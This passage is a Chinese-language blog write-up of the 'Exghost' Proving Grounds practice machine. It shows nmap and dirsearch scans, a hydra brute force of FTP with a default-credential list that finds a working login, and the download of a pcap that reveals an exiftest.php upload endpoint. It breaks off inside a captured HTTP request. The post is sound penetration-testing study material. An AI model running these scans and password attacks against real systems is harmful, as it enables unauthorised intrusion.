<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="en">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>ProvingGrounds Exghost Writeup - Xavier&#39;s Blog</title><meta name="author" content="Xavier">
<meta name="description" content="Exghost 第12台，Linux系统，难度Easy，名称 Exghost
"><meta name="keywords" content='OSCP, PG_Practice'>
  <meta itemprop="name" content="ProvingGrounds Exghost Writeup">
  <meta itemprop="description" content="Exghost 第12台，Linux系统，难度Easy，名称 Exghost">
  <meta itemprop="datePublished" content="2023-12-31T07:44:55+00:00">
  <meta itemprop="dateModified" content="2023-12-31T07:44:55+00:00">
  <meta itemprop="wordCount" content="2422">
  <meta itemprop="keywords" content="OSCP,PG_Practice"><meta property="og:url" content="http://localhost:1313/posts/provinggrounds-exghost/">
  <meta property="og:site_name" content="Xavier&#39;s Blog">
  <meta property="og:title" content="ProvingGrounds Exghost Writeup">
  <meta property="og:description" content="Exghost 第12台，Linux系统，难度Easy，名称 Exghost">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2023-12-31T07:44:55+00:00">
    <meta property="article:modified_time" content="2023-12-31T07:44:55+00:00">
    <meta property="article:tag" content="OSCP">
    <meta property="article:tag" content="PG_Practice">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="ProvingGrounds Exghost Writeup">
  <meta name="twitter:description" content="Exghost 第12台，Linux系统，难度Easy，名称 Exghost">
<meta name="application-name" content="Xavier&#39;s Blog">
<meta name="apple-mobile-web-app-title" content="Xavier&#39;s Blog"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/posts/provinggrounds-exghost/" title="ProvingGrounds Exghost Writeup - Xavier&#39;s Blog" /><link rel="prev" type="text/html" href="http://localhost:1313/posts/provinggrounds-helpdesk/" title="ProvingGrounds HelpDesk Writeup" /><link rel="next" type="text/html" href="http://localhost:1313/posts/provinggrouds_surf_writeup/" title="ProvingGrouds Surf WriteUp" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/posts/provinggrounds-exghost/index.md" title="ProvingGrounds Exghost Writeup - Xavier's Blog"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "ProvingGrounds Exghost Writeup",
    "inLanguage": "en",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "http:\/\/localhost:1313\/posts\/provinggrounds-exghost\/"
    },"genre": "posts","keywords": "OSCP, PG_Practice","wordcount":  2422 ,
    "url": "http:\/\/localhost:1313\/posts\/provinggrounds-exghost\/","datePublished": "2023-12-31T07:44:55+00:00","dateModified": "2023-12-31T07:44:55+00:00","publisher": {
      "@type": "Organization",
      "name": ""},"author": {
        "@type": "Person",
        "name": "Xavier"
      },"description": ""
  }
  </script><script src="/js/head/color-scheme.min.js"></script></head>
  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/" title="Xavier&#39;s Blog"><span class="header-title-text">Xavier&#39;s Blog</span></a><span class="header-subtitle">一个安全工作者</span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
              <a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
              <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
              <a class="menu-link" href="/friends/"><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item">
              <a class="menu-link" href="/tools/"><i class="fa-solid fa-screwdriver-wrench fa-fw fa-sm" aria-hidden="true"></i> Tools</a></li><li class="menu-item">
              <a class="menu-link" href="/about/"><i class="fa-solid fa-circle-info fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
            <input type="text" placeholder="搜索文章标题或内容……" id="search-input-desktop">
            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
            </a>
            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
            </a>
            <span class="search-button search-loading" id="search-loading-desktop">
              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
            </span>
          </li><li class="menu-item theme-switch" title="切换主题">
          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
        </li></ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/" title="Xavier&#39;s Blog"><span class="header-title-text">Xavier&#39;s Blog</span></a><span class="header-subtitle">一个安全工作者</span></div>
      <div class="menu-toggle" id="menu-toggle-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
            <div class="search mobile" id="search-mobile">
              <input type="text" placeholder="搜索文章标题或内容……" id="search-input-mobile">
              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
              </a>
              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
              </a>
              <span class="search-button search-loading" id="search-loading-mobile">
                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
              </span>
            </div>
            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
              取消
            </a>
          </li><li class="menu-item"><a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item"><a class="menu-link" href="/friends/"><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item"><a class="menu-link" href="/tools/"><i class="fa-solid fa-screwdriver-wrench fa-fw fa-sm" aria-hidden="true"></i> Tools</a></li><li class="menu-item"><a class="menu-link" href="/about/"><i class="fa-solid fa-circle-info fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item menu-system">
          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
      </ul>
    </nav>
  </div>
</header><div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
  </div>
  <div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
  </div><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="合集"></aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>ProvingGrounds Exghost Writeup</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/resource/friends/me.png" alt="Xavier" data-title="Xavier" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;Xavier</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/%E9%9D%B6%E5%9C%BA/" class="post-category" title="分类 - 靶场"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 靶场</a></span></div><div class="post-meta-line"><span title="发布于 2023-12-31 07:44:55"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2023-12-31">2023-12-31</time></span>&nbsp;<span title="2422 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 2500 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 5 分钟</span>&nbsp;</div>
    </div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>目录</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#exghost">Exghost</a></li>
    <li><a href="#portscan">PortScan</a></li>
    <li><a href="#initaccess">InitAccess</a></li>
    <li><a href="#pe">PE</a></li>
    <li><a href="#sumup">SumUp</a></li>
  </ul>
</nav></div>
      </div><div class="content" id="content" data-end-flag="It&#39;s end."><h2 id="exghost" class="heading-element"><span>Exghost</span>
  <a href="#exghost" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>第12台，Linux系统，难度Easy，名称 Exghost</p>
<h2 id="portscan" class="heading-element"><span>PortScan</span>
  <a href="#portscan" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ sudo nmap -n -r --min-rate<span class="o">=</span><span class="m">3500</span> -sSV 192.168.242.183 -T4       
</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> xavier 的密码：
</span></span><span class="line"><span class="cl">Starting Nmap 7.94 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-12-21 09:43 CST
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 192.168.242.183
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.27s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">997</span> filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
</span></span><span class="line"><span class="cl">PORT   STATE  SERVICE  VERSION
</span></span><span class="line"><span class="cl">20/tcp closed ftp-data
</span></span><span class="line"><span class="cl">21/tcp open   ftp      vsftpd 3.0.3
</span></span><span class="line"><span class="cl">80/tcp open   http     Apache httpd 2.4.41
</span></span><span class="line"><span class="cl">Service Info: Host: 127.0.0.1<span class="p">;</span> OS: Unix
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 11.32 seconds</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="initaccess" class="heading-element"><span>InitAccess</span>
  <a href="#initaccess" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>对Web进行扫描</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ dirsearch -x 400,403,404  -t <span class="m">500</span> -e php,asp,aspx,ini,txt,bak -u http://192.168.242.183/    
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  _<span class="p">|</span>. _ _  _  _  _ _<span class="p">|</span>_    v0.4.2
</span></span><span class="line"><span class="cl"> <span class="o">(</span>_<span class="o">||</span><span class="p">|</span> _<span class="o">)</span> <span class="o">(</span>/_<span class="o">(</span>_<span class="o">||</span> <span class="o">(</span>_<span class="p">|</span> <span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Extensions: php, asp, aspx, ini, txt, bak <span class="p">|</span> HTTP method: GET <span class="p">|</span> Threads: <span class="m">500</span> <span class="p">|</span> Wordlist size: <span class="m">11475</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Output File: /home/xavier/.dirsearch/reports/192.168.242.183/-_23-12-21_09-45-55.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Error Log: /home/xavier/.dirsearch/logs/errors-23-12-21_09-45-55.log
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Target: http://192.168.242.183/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>09:45:56<span class="o">]</span> Starting: 
</span></span><span class="line"><span class="cl"><span class="o">[</span>09:46:35<span class="o">]</span> <span class="m">301</span> -  320B  - /uploads  -&gt;  http://192.168.242.183/uploads/      
</span></span><span class="line"><span class="cl">                                                                             
</span></span><span class="line"><span class="cl">Task Completed</span></span></code></pre></td></tr></table>
</div>
</div><p>对ftp进行爆破</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice]
</span></span><span class="line"><span class="cl">└─$ hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 192.168.226.183 ftp
</span></span><span class="line"><span class="cl">Hydra v9.4 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-31 14:24:43
</span></span><span class="line"><span class="cl">[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
</span></span><span class="line"><span class="cl">[DATA] max 16 tasks per 1 server, overall 16 tasks, 66 login tries, ~5 tries per task
</span></span><span class="line"><span class="cl">[DATA] attacking ftp://192.168.226.183:21/
</span></span><span class="line"><span class="cl">[21][ftp] host: 192.168.226.183   login: user   password: system
</span></span><span class="line"><span class="cl">1 of 1 target successfully completed, 1 valid password found
</span></span><span class="line"><span class="cl">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-12-31 14:25:12</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ ftp user@192.168.226.183 
</span></span><span class="line"><span class="cl">Connected to 192.168.226.183.
</span></span><span class="line"><span class="cl"><span class="m">220</span> <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="m">331</span> Please specify the password.
</span></span><span class="line"><span class="cl">Password: 
</span></span><span class="line"><span class="cl"><span class="m">230</span> Login successful.
</span></span><span class="line"><span class="cl">Remote system <span class="nb">type</span> is UNIX.
</span></span><span class="line"><span class="cl">Using binary mode to transfer files.
</span></span><span class="line"><span class="cl">ftp&gt; ls
</span></span><span class="line"><span class="cl"><span class="m">229</span> Entering Extended Passive Mode <span class="o">(||</span><span class="p">|</span>29597<span class="p">|</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ftp: Can<span class="s1">&#39;t connect to `192.168.226.183:29597&#39;</span>: 连接超时
</span></span><span class="line"><span class="cl"><span class="m">200</span> EPRT <span class="nb">command</span> successful. Consider using EPSV.
</span></span><span class="line"><span class="cl"><span class="m">150</span> Here comes the directory listing.
</span></span><span class="line"><span class="cl">-rwxrwxrwx    <span class="m">1</span> <span class="m">0</span>        <span class="m">0</span>          <span class="m">126151</span> Jan <span class="m">27</span>  <span class="m">2022</span> backup
</span></span><span class="line"><span class="cl"><span class="m">226</span> Directory send OK.
</span></span><span class="line"><span class="cl">ftp&gt; get backup
</span></span><span class="line"><span class="cl">local: backup remote: backup
</span></span><span class="line"><span class="cl"><span class="m">200</span> EPRT <span class="nb">command</span> successful. Consider using EPSV.
</span></span><span class="line"><span class="cl"><span class="m">150</span> Opening BINARY mode data connection <span class="k">for</span> backup <span class="o">(</span><span class="m">126151</span> bytes<span class="o">)</span>.
</span></span><span class="line"><span class="cl">100% <span class="p">|</span>****************************************<span class="p">|</span>   <span class="m">123</span> KiB   55.84 KiB/s    00:00 ETA
</span></span><span class="line"><span class="cl"><span class="m">226</span> Transfer complete.
</span></span><span class="line"><span class="cl"><span class="m">126151</span> bytes received in 00:02 <span class="o">(</span>51.95 KiB/s<span class="o">)</span>
</span></span><span class="line"><span class="cl">ftp&gt; <span class="nb">exit</span>
</span></span><span class="line"><span class="cl"><span class="m">221</span> Goodbye.</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ file backup                              
</span></span><span class="line"><span class="cl">backup: pcap capture file, microsecond ts <span class="o">(</span>little-endian<span class="o">)</span> - version 2.4 <span class="o">(</span>Ethernet, capture length 262144<span class="o">)</span></span></span></code></pre></td></tr></table>
</div>
</div><p>是个数据包类型，想尝试用tcpdump去解析，没成功，直接双击backup，用wireshark进行分析</p>
<p>从中获取一个http数据包，发现文件上传接口exiftest.php：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/exiftest.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">127.0.0.1</span>
</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.5</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">multipart/form-data; boundary=---------------------------169621313238602050593908562572</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">14806</span>
